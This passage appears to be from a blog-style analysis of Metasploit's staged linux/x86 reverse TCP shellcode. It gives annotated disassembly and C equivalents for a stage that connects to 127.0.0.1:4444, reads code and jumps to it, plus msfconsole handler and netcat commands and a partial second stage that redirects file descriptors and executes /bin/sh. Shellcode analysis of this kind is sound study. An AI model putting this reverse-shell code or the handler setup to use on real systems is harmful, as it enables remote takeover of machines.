&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; push 0x00000000&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000000&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;DB&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000002&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;53&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; push 0x00000001&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000003&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;43&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000004&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;53&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; push 0x02&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000005&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A02&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; push 0x00000066&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000007&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A66&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x66&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; EAX = 0x66 (102)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000009&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;58&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; 2nd argument of socketcall(): pointer to arguments of SYS_BIND&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000000&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;E1&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; call socketcall syscall&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000000&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;CD80&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The instructions above can be converted into the following C code:&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define AF_INET       2
#define SOCK_STREAM   1
#define IPPROTO_IP    0
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPPROTO_IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;So, up until now, it created a TCP socket. The file descriptor of the new socket is stored into &lt;code&gt;EAX&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Next, the shellcode connects to the server socket (&lt;code&gt;127.0.0.1:4444&lt;/code&gt;):&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; exchanges EAX and EDI&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000000&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;97&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;xchg&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; EBX = 0x2&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000000&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;B&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; inet_aton(&quot;127.0.0.1&quot;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000010&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;687&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F000001&lt;/span&gt;        &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100007f&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; htons(4444)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000015&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;6668115&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C&lt;/span&gt;          &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5c11&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; push 0x00000002&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000019&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;6653&lt;/span&gt;              &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; 2nd argument of connect(): pointer to sockaddr struct&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000001&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;B&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;E1&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; syscall 102 (0x66): socketcall&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000001&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;D&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;A66&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x66&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000001&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;58&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; size of the sockaddr struct&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000020&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;50&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; Pointer to the sockaddr struct&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000021&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;51&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; File Descriptor of the Server Socket&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000022&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;57&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; 2nd argument of socketcall(): pointer to arguments of connect()&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000023&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E1&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;Based on the manual page of &lt;code&gt;socketcall&lt;/code&gt;, &lt;code&gt;ECX&lt;/code&gt; contains a pointer to the arguments for the function called, in this case &lt;code&gt;SYS_CONNECT&lt;/code&gt;.
&lt;/sub&gt;&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; 1st argument of socketcall(): SYS_CONNECT (EBX = 3)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000025&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;43&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;

&lt;span class=&quot;err&quot;&gt;00000026&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;CD80&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The instructions above can be converted into the following C code:&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;sockaddr_in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;client_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;client_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_family&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;inet_aton&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;client_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4444&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;sockaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;After that, data is read from the server:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; File Descriptor of the Server Socket&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000028&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;B&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;

&lt;span class=&quot;err&quot;&gt;00000029&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;99&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;cdq&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; EDX = 0x00000c00 (3072)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000002&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;B60C&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xc&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;Since &lt;code&gt;connect()&lt;/code&gt; stores &lt;code&gt;0x0&lt;/code&gt; into &lt;code&gt;EAX&lt;/code&gt; on success, after &lt;code&gt;CDQ&lt;/code&gt;, the register &lt;code&gt;EDX&lt;/code&gt; is zeroed
&lt;/sub&gt;&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; EAX = 0x3, which is the read syscall&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000002&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;B003&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000002&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;CD80&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;

&lt;span class=&quot;err&quot;&gt;00000030&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;FFE1&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;Call &lt;code&gt;read()&lt;/code&gt; in order to receive data from the server socket, and jump to &lt;code&gt;ECX&lt;/code&gt; (pointer to the top of the stack), where data is stored
&lt;/sub&gt;&lt;/p&gt;
&lt;p&gt;This last block of code allows the shellcode to receive data from the Server Socket. Data is placed on the stack.&lt;/p&gt;
&lt;p&gt;It translates into the following C code:&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// fd is the file descriptor of the socket created with socket()&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// ECX -&amp;gt; pointer to the top of stack, where data will be stored&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ECX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3072&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Up until now, I only analysed the 1st stage of the shellcode. To analyse the 2nd stage, I had to connect to a listening &lt;code&gt;Server&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;msfconsole
&lt;span class=&quot;c&quot;&gt;# msf6 &amp;gt; use exploit/multi/handler&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# msf6 exploit(multi/handler) &amp;gt; set PAYLOAD  linux/x86/shell/reverse_nonx_tcp&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# msf6 exploit(multi/handler) &amp;gt; set LHOST 127.0.0.1&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# msf6 exploit(multi/handler) &amp;gt; set LPORT 4444&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# msf6 exploit(multi/handler) &amp;gt; run -j&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;In another terminal window:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc 127.0.0.1 4444 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; stage2.bin

ndisasm &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; 32 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; intel stage2.bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Follows the assembly of the second stage:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; save File Descriptor of the Server Socket into EDI&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000000&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FB&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; push 0x00000002 and move it into ECX&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000002&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A02&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000004&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;59&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;The instruction &lt;code&gt;push byte&lt;/code&gt; is useful when you want to push a 32-bit integer value like &lt;code&gt;0x00000002&lt;/code&gt; but you have to avoid &lt;code&gt;NULL&lt;/code&gt; bytes. Moreover, it uses only &lt;code&gt;2&lt;/code&gt; bytes
&lt;/sub&gt;&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; push 0x0000002f (63) into EAX&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000005&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A3F&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3f&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000007&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;58&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; call syscall 63: dup2()&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000008&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;CD80&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;Use &lt;code&gt;dup2()&lt;/code&gt; to redirect &lt;code&gt;stderr&lt;/code&gt; to the Server Socket
&lt;/sub&gt;&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;0000000&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;49&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; jump back to 'push byte 0x3f', continue when ECX == -1&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000000&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;B&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;79&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;F8&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;jns&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;The instruction &lt;code&gt;JNS&lt;/code&gt; is useful when you want your loop to perform another iteration: when &lt;code&gt;ECX=0&lt;/code&gt;
&lt;/sub&gt;&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; set EAX to 0xb&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000000&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;D&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;A0B&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xb&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000000&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;58&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; clear EDX and use a string terminator (NULL byte)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000010&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;99&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;cdq&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000011&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;52&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; string '/bin//sh'&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000012&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;682&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F2F7368&lt;/span&gt;        &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x68732f2f&lt;/span&gt;
